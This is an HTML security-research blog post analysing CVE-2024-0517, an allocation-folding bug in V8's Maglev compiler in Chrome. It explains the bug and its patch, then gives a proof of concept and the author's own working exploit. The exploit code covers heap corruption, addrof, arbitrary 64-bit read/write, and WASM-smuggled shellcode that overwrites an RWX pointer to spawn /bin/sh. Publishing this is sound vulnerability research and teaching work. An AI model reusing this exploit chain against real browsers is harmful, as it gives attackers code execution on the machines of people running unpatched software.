<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2024-0517 Quick Blog | Security Research Blog</title>
    <meta name="description" content="This post explores a vulnerability found in the Maglev optimizing compiler of V8, specifically within a function responsible for optimizing classes that inherit...">
    <link href="/src/index.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <style>
        body { 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
        }
        .code-block {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        .gradient-text {
            background: linear-gradient(135deg, #f97316, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
        .prose h1 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 2.5rem;
            font-weight: 800;
            margin-top: 3rem;
            margin-bottom: 1.5rem;
        }
        .prose h2 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 2rem;
            font-weight: 700;
            margin-top: 3rem;
            margin-bottom: 1rem;
            border-bottom: 2px solid #374151;
            padding-bottom: 0.5rem;
        }
        .prose h3 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 1.5rem;
            font-weight: 600;
            margin-top: 2rem;
            margin-bottom: 0.75rem;
        }
        .prose h4 {
            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
            font-size: 1.25rem;
            font-weight: 600;
            margin-top: 1.5rem;
            margin-bottom: 0.5rem;
        }
        .prose p {
            margin-bottom: 1.5rem;
            line-height: 1.7;
            color: #d1d5db;
        }
        .prose strong {
            color: #f3f4f6;
            font-weight: 600;
        }
        .prose code {
            background: #1e1e1e;
            color: #fbbf24;
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        .prose pre {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1.5rem;
            overflow-x: auto;
            margin: 2rem 0;
        }
        .prose pre code {
            background: transparent;
            color: #e5e7eb;
            padding: 0;
            border-radius: 0;
        }
        .prose blockquote {
          background:rgb(93, 45, 26);
          color:rgb(255, 255, 255);
          border-left: 4px solid #ff8c00;
          padding: 1rem 1.25rem;
          margin: 1.25rem 0;
          border-radius: calc(var(--radius) - 2px);
        }
        .prose ul, .prose ol {
            list-style-color: #ff8c00;
            list-style-type: disc;
            list-style-position: outside;
            margin: 1.5rem 0;
            padding-left: 2rem;
        }
        .prose li {
            margin: 0.5rem 0;
            color: #d1d5db;
        }
        .prose li::marker {
            color: #ff8c00 !important;
        }
        .prose ol li {
            list-style-type: decimal;
        }
        .prose table {
            margin: 2rem 0;
            background: #1e1e1e;
            border-radius: 8px;
            overflow: hidden;
        }
        .prose th, .prose td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        .prose th {
            background: #2d2d2d;
            color: #f3f4f6;
            font-weight: 600;
        }
        .prose img {
            border-radius: 8px;
            margin: 2rem 0;
            max-width: 100%;
        }
        .prose hr {
            border: none;
            height: 2px;
            background: linear-gradient(90deg, transparent, #374151, transparent);
            margin: 3rem 0;
        }
        .prose a { color: rgb(3, 203, 146); text-decoration: underline; }
    </style>
</head>
<body class="min-h-screen">
    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
        <header class="mb-12">
            <a href="/blogs" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
            <h1 class="text-4xl md:text-5xl font-bold mb-4">
                <span class="gradient-text">CVE-2024-0517 Quick Blog</span>
            </h1>
            <div class="mb-8"><img src="/posts/CVE-2024-0517-Analysis/featured.png" alt="CVE-2024-0517 Quick Blog cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
                <span>May 3, 2024</span>
                <span>•</span>
                <span>7 min read</span>
                <span>•</span>
                <div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">browser</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">v8</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">maglev</span></div>
            </div>
        </header>

        <article class="prose prose-invert max-w-none">
<p>This post explores a vulnerability found in the Maglev optimizing compiler of V8, specifically within a function responsible for optimizing classes that inherit from a parent class.</p>
<!--more-->
<h2 id="the-bug">The Bug</h2>
<p>The bug is located in the <code>VisitFindNonDefaultConstructorOrConstructMaglev</code> function. This function attempts to optimize a class that has a parent class, but the manner in which it is lowered introduces a critical issue.</p>
<ol>
<li><strong>Garbage Collection Trigger</strong>: </li>
</ol>
<ul>
<li><p>Executing <code>[1000] = 8</code> triggers garbage collection (GC).</p></li>
<li><p>During GC, if it occurs between two folded allocations, the first allocated chunk may be relocated, and the space of the second allocation is freed since no objects point to it at that moment. This leads to an out-of-bounds (OOB) access during subsequent folded allocations.</p>
<p><img src="/images/cve-2024-0517-quicky/image.png" alt="Memory Allocation Visualization" /></p></li>
</ul>
<blockquote>
  <p><strong>Note</strong>: In the image, the chunks are <strong>moved</strong> from the young generation to old space. The labels "old" and "new" denote the previous and current allocations, respectively, and should not be confused.</p>
</blockquote>
<ol start="2">
<li><strong>Allocation Process</strong>:</li>
</ol>
<ul>
<li>The <code>BuildAllocateFastObject()</code> function calls <code>ExtendOrReallocateCurrentRawAllocation()</code>.</li>
<li><strong>Preconditions</strong> for allocation:<ul>
<li>The object being constructed must be constant: <code>if (!maybe_constant) return false;</code></li>
<li>The parent constructor must be a function: <code>if (!current.IsJSFunction()) return false;</code></li>
<li>The validity of the <code>new_target_function</code> as a constructor is checked: </li></ul></li>
</ul>
<pre><code class="javascript language-javascript">if (new_target_function &amp;&amp; new_target_function-&gt;IsJSFunction() &amp;&amp; HasValidInitialMap(new_target_function-&gt;AsJSFunction(), current_function))
</code></pre>
<ul>
<li>If these conditions are met, <code>BuildAllocateFastObject</code> is invoked for allocation in the young generation.</li>
</ul>
<h2 id="exploit">Exploit</h2>
<p><img src="/images/cve-2024-0517-quicky/image-1.png" alt="Exploit Flow Visualization" /></p>
<p>To exploit this vulnerability:</p>
<ol>
<li><strong>Obtain Addrof Primitive</strong>: Start by acquiring an <code>addrof</code> primitive, which allows you to read memory addresses.</li>
<li><strong>Shellcode Smuggling</strong>: You embed you shellcode into floating point numbers in the wasm code. Through which you can execute 2/3 byte instructions and jump to the next floating point number.</li>
<li><strong>Problem with this Sandbox Escape</strong>: Once the WASM instance has been transitioned to trusted space, a new method is required to escape the sandbox and regain control over code execution.</li>
</ol>
<h2 id="patch">Patch</h2>
<p>To address this vulnerability, the developers implemented the following changes:</p>
<ul>
<li><p><strong>Invoke <code>ClearCurrentRawAllocation</code></strong>: This function sets <code>current_raw_allocation</code> to <code>null</code>, ensuring that both allocations occur without the risk of being folded across a garbage collection (GC) run. This change prevents the out-of-bounds access that was causing the vulnerability.</p></li>
<li><p><strong>Securing WASM Instances</strong>: The WASM instance has been moved into a trusted zone. Developers are actively working to eliminate any unsafe pointers associated with this instance, enhancing the security of the overall system.</p></li>
</ul>
<h2 id="poc">poc:</h2>
<pre><code class="js language-js">// Direct from the Exodus Blog (mentioned below).
function main() {
    class ClassParent {}
    class ClassBug extends ClassParent {
        constructor() {
            const v24 = new new.target();               // makes the checkvalue of the parent class to be constant with this call.
            super();                                    // Creates the instance of `this` object and allocates the memory required for storing infor for this object.
            let a = [9.9,9.9,9.9,1.1,1.1,1.1,1.1,1.1];  // After triggering the GC in the wrong folded allocation this gets allocated, which gives us OOB
        }
        [1000] = 8; // trigger the GC
    }
    // triggering the maglev optimizer.
    for (let i = 0; i &lt; 300; i++) {
        Reflect.construct(ClassBug, [], ClassParent);
    }
}
%NeverOptimizeFunction(main);
main();
</code></pre>
<h2 id="my-exploit">My exploit:</h2>
<p>Some Basic utilities to make my exploitation phase easier: (includes float to int and vice-versa, trigger GC with the help of huge allcoations).</p>
<pre><code class="js language-js">///////////////////////////////////////////////////////////////////////
///////////////////         Utility Functions       ///////////////////
///////////////////////////////////////////////////////////////////////

let hex = (val) =&gt; '0x' + val.toString(16);

// 8 byte array buffer
const __buf = new ArrayBuffer(8);
const __f64_buf = new Float64Array(__buf);
const __u32_buf = new Uint32Array(__buf);

// typeof(val) = float
function ftoi(val) {
    __f64_buf[0] = val;
    return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) &lt;&lt; 32n); // Watch for little endianness
}

function print(x){
    console.log("[+] " + x);
}

// typeof(val) = BigInt
function itof(val) {
    __u32_buf[0] = Number(val &amp; 0xffffffffn);
    __u32_buf[1] = Number(val &gt;&gt; 32n);
    return __f64_buf[0];
}

function sleep(ms) {
    return new Promise(resolve =&gt; setTimeout(resolve, ms));
}

function reverse(x) {
    var buf = new ArrayBuffer(0x20);
    var view1 = new BigInt64Array(buf);
    var view2 = new Uint8Array(buf);
    view1[0] = x;
    view2.reverse();
    return view1[3];
}

function assert(x) {
    console.assert(x);
}
</code></pre>
<p>I have 2 wasm instances because, the first <code>wasm_code</code> has our smuggled shellcode, which I have covered in the <a href="./../1728447510508-v8---arrayshift-race-condition./#how-to-smuggle-shellcode">ArrayShift Blogpost</a>, The <code>wasm_instance_helper</code> is the object in which we will corrupt and redirect the <code>RWX</code> region to our shellcode. </p>
<pre><code class="js language-js">////////////////////////////////////////////////////////////////////////
/////////////////////         Main Exploit         /////////////////////
////////////////////////////////////////////////////////////////////////

// for future - shellcode smuggling
var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x05,0x01,0x60,0x00,0x01,0x7c,0x03,0x02,0x01,0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0a,0x53,0x01,0x51,0x00,0x44,0xbb,0x2f,0x73,0x68,0x00,0x90,0xeb,0x07,0x44,0x48,0xc1,0xe3,0x20,0x90,0x90,0xeb,0x07,0x44,0xba,0x2f,0x62,0x69,0x6e,0x90,0xeb,0x07,0x44,0x48,0x01,0xd3,0x53,0x31,0xc0,0xeb,0x07,0x44,0xb0,0x3b,0x48,0x89,0xe7,0x90,0xeb,0x07,0x44,0x31,0xd2,0x48,0x31,0xf6,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x0b]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f1 = wasm_instance.exports.main;

// to corrupt the pointer here.
var wasm_code_helper = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod_helper = new WebAssembly.Module(wasm_code_helper);
var wasm_instance_helper = new WebAssembly.Instance(wasm_mod_helper);
var f2 = wasm_instance_helper.exports.main;
</code></pre>
<p>This is similar to the POC where they have specific conditions met to trigger the <code>ExtendOrReallocateCurrentRawAllocation</code> through the <code>ClassBug</code>. Additionally, the only confusing part is, how to know the number of times to call the <code>reflect.construct</code> and when do we know it triggered the actual bug. I was also confused reading the blogpost from exodus, when I asked the exploit dev, he suggested running it multiple times and getting the limit through trial and error.</p>
<pre><code class="js language-js">function gc(){
    for(let i=0;i&lt;0x10;i++) new ArrayBuffer(0x100000);
}

let dogc_flag = null;
function dogc(){
    if(dogc_flag){
        gc();
    }
}

let empty_object = {};
let empty_array = [];
let corrupted_instance = null;

// Main vulnerability.
class ClassParent {}
class ClassBug extends ClassParent {
    constructor(a20, a21, a22) {
        const v24 = new new.target();
        let x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
        super();    
        let a = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1];
        this.x = x;
        this.a = a;
        JSON.stringify(empty_array);
    }
    [1] = dogc();
}

// jit compile the dogc()
for (let i = 0; i&lt;200; i++) {
    dogc_flag = false;
    if (i%2 == 0) dogc_flag = true;
    dogc();
}

for (let i = 0; i &lt; 650; i++) {
    dogc_flag=false;
    if (i == 644 || i == 645 || i == 646 || i == 640) {
        dogc_flag=true;
        dogc();
        dogc_flag=false;
    }
    if (i == 646) dogc_flag=true;

    let x = Reflect.construct(ClassBug, empty_array, ClassParent);
    if (i == 646) {
        corrupted_instance = x;
    }
}
</code></pre>
<p>Once we get he corrupted instance, It should be straight forward exploitation. We can get <code>addrof</code> primitive and try to get arb read/ write primitive.</p>
<pre><code class="js language-js">function addrof(obj){
    corrupted_instance.x[0] = obj;
    __f64_buf[0] = corrupted_instance.a[8];
    return __u32_buf[0];
}

// overwrite the length of `a` array.
corrupted_instance.x[5] = 0x10000;

let oob = [1.1, 2.2, 3.3];
let addr_oob = addrof(oob);
let addr_a = addrof(corrupted_instance.a);

// Quick check
if(addr_oob &lt; addr_a &amp;&amp; corrupted_instance.a.length != 0x10000){
    console.log("Exploit Failure!");
}

let off = (addr_oob - addr_a ) + 0xc;
if(off%8 != 0){
    off -= 4;
}
off = off / 8;
off += 9;
</code></pre>
<pre><code class="js language-js">print("Achieved 64 bit read write primitive.")
function write_64(addr, val){
    corrupted_instance.a[off] = itof(BigInt(0x3*0x100000000 + addr-8));
    oob[0] = itof(BigInt(val));
}

function read_64(addr){
    corrupted_instance.a[off] = itof(BigInt(0x3*0x100000000 + addr-8));
    return ftoi(oob[0]);
}
</code></pre>
<pre><code class="js language-js">let addr_wasm = addrof(wasm_instance);
let addr_rwx = read_64(addr_wasm + 0x48);

print("Leaks:")
print("wasm_isntance: " + addr_wasm.toString(16));
print("RWX region: " + addr_rwx.toString(16));

let shell_off = 0x81an

// get the shellcode in memory.
f1();
write_64(addrof(wasm_instance_helper)+0x48, addr_rwx+shell_off);

// trigger the /bin/sh syscall.
f2();
</code></pre>
<h3 id="smuggling-shellcode">Smuggling shellcode:</h3>
<p>Again I have explained it in this <a href="./../1728447510508-v8---arrayshift-race-condition./#how-to-smuggle-shellcode">blogpost</a></p>
<h2 id="extras">Extras</h2>
<ul>
<li>You can find my full exploit and related files here: <a href="https://github.com/tourpran/pwn-hub/tree/main/v8-exp/cve-2024-0517">repo to files</a></li>
<li><strong><code>new.target</code></strong>: This property indicates whether an object was instantiated using the <code>new</code> keyword. For class constructors, it provides a reference to the function with which the object was created, allowing for better control and functionality in class hierarchies.</li>
<li><strong><code>Reflect.construct</code></strong>: This method creates a new object using the specified <code>target</code> class constructor along with a provided argument list. It enables more flexible instantiation of objects, especially when dealing with inheritance and prototype chains.</li>
<li><strong>Allocation Folding</strong>: When the V8 engine anticipates a need for additional space in the future, it attempts to allocate the entire required memory in a single operation. This technique can optimize memory usage but may lead to vulnerabilities if not managed properly.</li>
<li><strong><code>FindNonDefaultConstructorOrConstruct</code></strong>: This function constructs an object by traversing the prototype chain to find a non-default constructor, invoking the appropriate <code>super()</code> constructor as needed. The optimization method <code>VisitFindNonDefaultConstructorOrConstruct</code> aims to streamline this process, enhancing performance.</li>
</ul>
<h2 id="reference">Reference</h2>
<ul>
<li>Special thanks to <code>sherlock</code> Bhaiya for the invaluable assistance in completing this exploit.</li>
<li><a href="https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/">Exodus Intelligence Blog: Google Chrome V8 CVE-2024-0517 - Out-of-Bounds Write & Code Execution</a></li>
</ul>
        </article>
        
        <!-- Navigation -->
        <nav class="mt-16 pt-8 border-t border-gray-700">
            <div class="flex justify-between items-center">
                <div class="flex-1">
                    <a href="/posts/v8-ArrayShift-Race-Condition.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
                        </svg>
                        <div class="text-left">
                            <div class="text-xs text-gray-400">Previous</div>
                            <div class="font-medium">v8 - ArrayShift Race Condition</div>
                        </div>
                    </a>
                </div>
                <div class="flex-1 text-center">
                    <a href="/blogs" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Posts</a>
                </div>
                <div class="flex-1 text-right">
                    <a href="/posts/expm1-35C3-Bug/-Optimizations-Analysis.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
                        <div class="text-right">
                            <div class="text-xs text-gray-400">Next</div>
                            <div class="font-medium">expm1-35C3 - Bug/ Optimizations Analysis</div>
                        </div>
                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                        </svg>
                    </a>
                </div>
            </div>
        </nav>
    </div>
<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
</body>
</html>